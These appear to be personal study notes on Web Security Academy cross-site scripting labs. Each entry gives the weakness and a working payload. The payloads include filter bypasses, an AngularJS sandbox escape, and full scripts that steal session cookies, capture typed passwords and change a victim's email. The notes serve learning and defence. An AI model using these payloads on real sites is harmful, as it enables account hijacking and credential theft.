__________________________________________________________________________________________


Add a storeId query parameter to the URL and enter a random alphanumeric string as its value.
Notice that your random string is now listed as one of the options in the drop-down list.

SOLUTION:
Change the URL to include a suitable XSS payload inside the storeId parameter as follows:
product?productId=1&storeId=""></select><img%20src=1%20onerror=alert(1)>

__________________________________________________________________________________________


DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded:

WEAKNESS:
Unsanitized user input is evaluated inside {{ }} AngularJS expressions

SOLUTION:
Enter a random alphanumeric string into the search box.
View the page source and observe that your random string is enclosed in an ng-app directive.
Enter the following AngularJS expression in the search box: {{$on.constructor('alert(1)')()}}

__________________________________________________________________________________________


Reflected DOM XSS:

WEAKNESS:
Improper escaping of backslashes, user input in JSON is executed unsafely with eval()

OBSERVATION:
Search for a random test string, such as "XSS".
Notice that the string is reflected in a JSON response called search-results.
Notice the searchResults.js file and that the JSON response is used with an eval() function call.
By trying with different search strings, notice that the JSON response is escaping quotation marks except backslash.

SOLUTION:
To solve this lab, enter the following search term: \"-alert(1)}//

EXPLANATION:
As you have injected a backslash and the site isn't escaping them.
When the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. 
The resulting double-backslash causes the escaping to be effectively canceled out. 
This means that the double-quotes are processed unescaped, which closes the string that should contain the search term.
Add a curly bracket (end js object) and double forward slash (comment) gives you a valid javascript object.

__________________________________________________________________________________________


Stored DOM XSS:

WEAKNESS:
Incomplete sanitization where replace() only encodes the first occurrence of </>

SOLUTION:
Post a comment containing the following vector: <><img src=1 onerror=alert(1)>

EXPLANATION:
The website uses the JavaScript replace() function to encode angle brackets. 
However, when the first argument is a string, the function only replaces the first occurrence. 
We can simply include an extra set of angle brackets at the beginning of the comment. 
These angle brackets will be encoded, but any subsequent angle brackets will be unaffected.

__________________________________________________________________________________________


Reflected XSS into HTML context with most tags and attributes blocked:

WEAKNESS:
Incomplete blacklist filter (html tag and event listener)

SOLUTION:
Inject a standard XSS vector, such as: <img src=1 onerror=print()>, it this gets blocked. 
In Burp Intruder, replace the value of the search term with: <> Then add § to create a payload position.
Visit the XSS cheat sheet and click Copy tags and paste as payload.
After the attack, note that most payloads caused a 400 response, but the body payload caused a 200 response.
Use the valid tag. Add § to create a payload position, looks like: <body%20§§=1>
Visit the XSS cheat sheet and click Copy events to clipboard and paste as payload.
Adter th eattack, note that most payloads caused a 400 response, but the onresize payload caused a 200 response.
Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID:
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>

EXPLANATION:
Trick victim to click a maliciuos link, the page is very small, resizing the page will trigger malicious program.

__________________________________________________________________________________________


Reflected XSS into HTML context with all tags blocked except custom ones:

WEAKNESS:
Incomplete filtering as standard tags blocked but custom tags allowed

SOLUTION:
Inject <p> id=x onfocus=alert(document.cookie) tabindex=1 </p>, won't work.
Inject <xss id=x onfocus=alert(document.cookie) tabindex=1 >, works.
Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID:
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>

EXPLANATION:
Create a custom tag which expose cookie, add onfocus will trigger it, add id of x.
Extend the link with hash #x to focues on the custom tag to trigger cookie exposure when user click.

__________________________________________________________________________________________


Reflected XSS with some SVG markup allowed:

WEAKNESS:
Incomplete filtering as common tags blocked but SVG/event attributes allowed

SOLUTION:
Inject a standard XSS vector, such as: <img src=1 onerror=print()>, it this gets blocked. 
In Burp Intruder, replace the value of the search term with: <> Then add § to create a payload position.
Visit the XSS cheat sheet and click Copy tags and paste as payload.
After the attack, note that <svg>, <animatetransform>, <title>, and <image> returns 200 response.
Use the valid tag. Add § to create a payload position, looks like: <svg><animatetransform%20§§=1>
Visit the XSS cheat sheet and click Copy events to clipboard and paste as payload.
After the attack, note that onbegin event return a 200 response.
Visit the following url:
https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E

__________________________________________________________________________________________


Reflected XSS in canonical link tag:

WEAKNESS:
User input injected unsafely into canonical link tag attributes. 
Escaping only angle brackets, not quotes or event attributes

SOLUTION:
Visit the following URL, replacing YOUR-LAB-ID with your lab ID:
https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
When a user presses the access key X, the alert function is called.
To trigger the exploit on yourself, press one of the following key combinations:
    On Windows: ALT+SHIFT+X
    On MacOS: CTRL+ALT+X
    On Linux: Alt+X

EXPLANATION:
<link rel="canonical" href='https://blablabla.com/?'accesskey='x'onclick='alert(1)'/>

__________________________________________________________________________________________


Reflected XSS into a JavaScript string with single quote and backslash escaped:

WEAKNESS:
Escaping quotes only, not preventing script block termination.

SOLUTION:
Submit a random string in the search box.
Inspect the element, and observe that the random string has been reflected inside a JavaScript string.
Try to add a single quote ' and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string.
Replace your input with the following payload to break out of the script block and inject a new script:
</script><script>alert(1)</script>

__________________________________________________________________________________________


Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped:

WEAKNESS:
Escaping single quotes but not backslashes, allowing string breakout.

SOLUTION:
Submit a random string in the search box.
Inspect the element, and observe that the random string has been reflected inside a JavaScript string.
Try to add a single quote ' and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string.
Try to add a back slash \ and observe that your \ doesn't get escaped.
Replace your input with the following payload to break out of the script block and inject a new script:
\'-alert(1)//

__________________________________________________________________________________________


Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped:

WEAKNESS:
Single quote ' is escaped, but &apos; is decoded back into ' in the browser

SOLUTION:
Insert http://evil.com' + alert() + ' as comment, submit but appear as 'http://evil.com\' + alert() + \'' , which won't work.
Insert http://evil.com?&apos;-alert(1)-&apos; as comment, submit then click will trigger alert.

EXPLANATION:
Works when input posted in html context. Writing a javascript string inside a javascript function inside html. html context will be decoded later.

__________________________________________________________________________________________


Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped:

WEAKNESS:
User input reflected inside a JavaScript backtick string, allowing ${} injection

SOLUTION:
Submit a random string with < ' " \ ` in the search box.
Inspect the element, and observe that the characters have been escaped inside a JavaScript string.
Notice that the javascript string is covered by backtick ` itself.
Replace your input with the following payload to execute JavaScript inside the template string: ${alert(1)} 

__________________________________________________________________________________________


Exploiting cross-site scripting to steal cookies:

WEAKNESS:
Attacker injects script into comments that steals cookies and CSRF token from comment viewer.

SOLUTION:
Send a GET /post/comment request, you'll find csrf token.
Inspect the post/comment element, you'll also find csrf token in the comment form too.
Post the script below as a comment:
<script>
    window.addEventListener('DOMContentLoaded', function() {

        var token = document.getElementsByName('csrf')[0].ariaValueMax;
        var data = new FormData();

        data.append('csrf', token);
        data.append('postId', POST_ID_INTEGER);
        data.append('comment', this.document.cookie);
        data.append('name', 'john');
        data.append('email', 'john@example.com');
        data.append('website', 'http://example.com');

        this.fetch('/post/comment', {
            method: 'POST',
            mode: 'no-cors',
            body: data
        });
    });
</script>
Send a /my-account request with the session cookie in comment. We've hijacked the victim's account

__________________________________________________________________________________________


Exploiting cross-site scripting to capture passwords:

WEAKNESS:
Attacker injects script into comments that steals username and password from comment viewer.

SOLUTION:
Send a GET /post/comment request, you'll find csrf token.
Inspect the post/comment element, you'll also find csrf token in the comment form too.
Post the script below as a comment:
<input type="text" name="username">
<input type="password" name="password" onchange="hax()">
<script>
    function hax() {
        var token = document.getElementsByName('csrf')[0].value;
        var username = document.getElementsByName('username')[0].value;
        var password = document.getElementsByName('password')[0].value;

        var data = new FormData();
        data.append('csrf', token);
        data.append('postId', 8);
        data.append('comment', this.document.cookie);
        data.append('name', 'victim');
        data.append('email', 'john@example.com');
        data.append('website', 'http://example.com');

        this.fetch('/post/comment', {
            method: 'POST',
            mode: 'no-cors',
            body: data
        });

    }
</script>
Victim's username and password will be shown in comment.

__________________________________________________________________________________________


Exploiting XSS to bypass CSRF defenses:

WEAKNESS:
Attacker injects script into comments that change comment viewer's email to his.

SOLUTION:
Send a GET /my-account/change-email request, you'll find csrf token.
Inspect the post/comment element, you'll also find csrf token in the comment form too.
Post the script below as a comment:
//<script>
    window.addEventListener('DOMContentLoaded', function() {

        var token = document.getElementsByName('csrf')[0].ariaValueMax;
        var data = new FormData();

        data.append('csrf', token);
        data.append('email', 'attacker@mail.com');

        this.fetch('/my-account/change-email', {
            method: 'POST',
            mode: 'no-cors',
            body: data
        });

    });
//</script>
Victim's email will be changed to attacker's email.

__________________________________________________________________________________________


Appendix:


document.write() : dynamically insert content into the page.

location.search() : It takes data directly from the query string in the URL and writes it into the DOM without sanitization

<a href="javascript:alert('Hello!')">Click me</a> :
can run JavaScript in an href attribute using the javascript: URI scheme, but it’s generally considered unsafe and bad practice today.

innerHTML: The HTML inside the element, <p>Hello</p>

outerHTML: The HTML of the element itslef + contents, <div id='box'><p>Hello</p></div>

canonical tag: 
A HTML element (<link rel="canonical">) placed in <head> section of webpage.
It's used to tell search engines which version of a webpage is the “preferred” or authoritative one when multiple URLs contain similar or duplicate content.

csrf token: Ensure the request originates from the same location as the form was generated.

There are three major types of XSS attacks:

1. **DOM-based XSS (Document Object Model-based Cross-site Scripting)**:
    - Uses the HTML environment to execute malicious JavaScript.
    - Commonly exploits the `<script></script>` HTML tag.

2. **Persistent XSS (Server-side)**:
    - JavaScript is executed when the server loads the page containing it.
    - Occurs when the server does not sanitize user data before storing it.
    - Commonly found on blog posts or comment sections.

3. **Reflected XSS (Client-side)**:
    - JavaScript is executed on the client-side of the web application.
    - Typically occurs when the server does not sanitize search or input data.